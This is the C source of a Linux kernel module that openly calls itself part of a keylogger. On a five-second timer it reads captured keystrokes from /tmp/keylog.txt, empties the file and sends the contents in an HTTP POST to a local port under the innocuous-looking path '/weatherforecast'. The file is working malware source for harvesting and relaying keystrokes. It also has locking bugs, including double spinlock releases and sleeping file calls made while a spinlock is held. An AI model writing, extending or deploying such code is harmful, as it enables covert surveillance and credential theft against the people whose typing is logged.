#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/uio.h>
#include <linux/kfifo.h>

#define LOG_FILE_PATH "/tmp/keylog.txt"
#define TIMER_INTERVAL (5 * HZ) // Interval for the timer (5 seconds)
#define PORT 5247               // Define the port number

static DEFINE_SPINLOCK(file_lock); // Spinlock for synchronizing file access
static struct timer_list my_timer;
static struct workqueue_struct *read_workqueue;

struct read_work_data
{
    struct work_struct work;
};

struct http_work_data
{
    struct work_struct work;
    char *post_data;
};

static void send_http_post_work(struct work_struct *work)
{
    struct http_work_data *data = container_of(work, struct http_work_data, work);
    struct socket *sock;
    struct sockaddr_in server_addr;
    struct msghdr msg = {0};
    struct kvec vec;
    char *http_request;
    char *response;
    int ret;

    char toSend[512];
    snprintf(toSend, 512, "{\"Time\":\"2137\",\"ID\":\"69\",\"Key\":\"%s\"}", data->post_data);

    http_request = kzalloc(1024, GFP_KERNEL);
    if (!http_request)
    {
        pr_err("Memory allocation for HTTP request failed\n");
        kfree(data->post_data);
        kfree(data);
        return;
    }

    snprintf(http_request, 1024,
             "POST /weatherforecast HTTP/1.1\r\n"
             "Host: localhost:%d\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s",
             PORT, strlen(toSend), toSend);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0)
    {
        pr_err("Failed to create socket: %d\n", ret);
        kfree(http_request);
        kfree(data->post_data);
        kfree(data);
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    in4_pton("127.0.0.1", -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);

    ret = kernel_connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0)
    {
        pr_err("Failed to connect to server: %d\n", ret);
        sock_release(sock);
        kfree(http_request);
        kfree(data->post_data);
        kfree(data);
        return;
    }

    vec.iov_base = http_request;
    vec.iov_len = strlen(http_request);
    msg.msg_flags = 0;

    ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(http_request));
    if (ret < 0)
        pr_err("Failed to send HTTP request: %d\n", ret);

    response = kzalloc(1024, GFP_KERNEL);
    if (response)
    {
        vec.iov_base = response;
        vec.iov_len = 1024;
        ret = kernel_recvmsg(sock, &msg, &vec, 1, 1024, msg.msg_flags);
        if (ret >= 0)
            pr_info("Received response: %s\n", response);
        kfree(response);
    }

    sock_release(sock);
    kfree(http_request);
    kfree(data->post_data);
    kfree(data);
}

static void read_keylog_file(struct work_struct *work)
{
    struct file *file;
    char buffer[256]; // Buffer to store file data
    loff_t pos = 0;   // File read position
    ssize_t ret;

    pr_info("Reading data from file: %s\n", LOG_FILE_PATH);

    // Lock the spinlock to prevent concurrent access
    spin_lock(&file_lock);

    // Open the file in read-only mode
    file = filp_open(LOG_FILE_PATH, O_RDONLY, 0777);
    if (IS_ERR(file))
    {
        pr_err("Failed to open log file for reading. Error: %ld\n", PTR_ERR(file));
        spin_unlock(&file_lock); // Unlock the spinlock if file open fails
        return;
    }
    // Read data from the file and print to logs
    ret = kernel_read(file, buffer, sizeof(buffer) - 1, &pos);
    if (ret < 0)
    {
        pr_err("Failed to read from log file. Error: %ld\n", ret);
        filp_close(file, NULL);
        spin_unlock(&file_lock); // Unlock the spinlock in case of error
        return;
    }

    // Null-terminate buffer
    buffer[ret] = '\0';

    // Print the read data to kernel logs
    pr_info("Data from log file: %s\n", buffer);

    // Close the file
    filp_close(file, NULL);
    
    vfs_truncate(&(file->f_path), strlen(buffer));
    spin_unlock(&file_lock);

    // Prepare and queue the HTTP POST work
    struct http_work_data *http_data = kmalloc(sizeof(*http_data), GFP_KERNEL);
    if (!http_data)
    {
        pr_err("Failed to allocate memory for HTTP work data\n");
        spin_unlock(&file_lock);
        return;
    }

    http_data->post_data = kstrdup(buffer, GFP_KERNEL);
    if (!http_data->post_data)
    {
        pr_err("Failed to allocate memory for post data\n");
        kfree(http_data);
        spin_unlock(&file_lock);
        return;
    }

    INIT_WORK(&http_data->work, send_http_post_work);
    queue_work(read_workqueue, &http_data->work);

    // Unlock the spinlock
}

static void timer_callback(struct timer_list *t)
{
    struct read_work_data *work_data;

    // Allocate work data
    work_data = kmalloc(sizeof(*work_data), GFP_KERNEL);
    if (!work_data)
    {
        pr_err("Failed to allocate memory for work data\n");
        mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
        return;
    }

    // Initialize work and queue it
    INIT_WORK(&work_data->work, read_keylog_file);
    queue_work(read_workqueue, &work_data->work);

    // Re-schedule the timer
    mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
}

static int __init read_keylog_init(void)
{
    pr_info("Keylogger module loaded: Starting periodic file read\n");

    // Create a workqueue
    read_workqueue = create_singlethread_workqueue("read_workqueue");
    if (!read_workqueue)
    {
        pr_err("Failed to create workqueue\n");
        return -ENOMEM;
    }

    // Initialize the timer
    timer_setup(&my_timer, timer_callback, 0);

    // Schedule the first timer execution
    mod_timer(&my_timer, jiffies + TIMER_INTERVAL);

    return 0;
}

static void __exit read_keylog_exit(void)
{
    // Delete the timer
    del_timer_sync(&my_timer);

    // Destroy the workqueue
    destroy_workqueue(read_workqueue);

    pr_info("Keylogger module unloaded\n");
}

module_init(read_keylog_init);
module_exit(read_keylog_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Twój Nick");
MODULE_DESCRIPTION("Prosty sterownik do cyklicznego odczytu z pliku keylog.txt");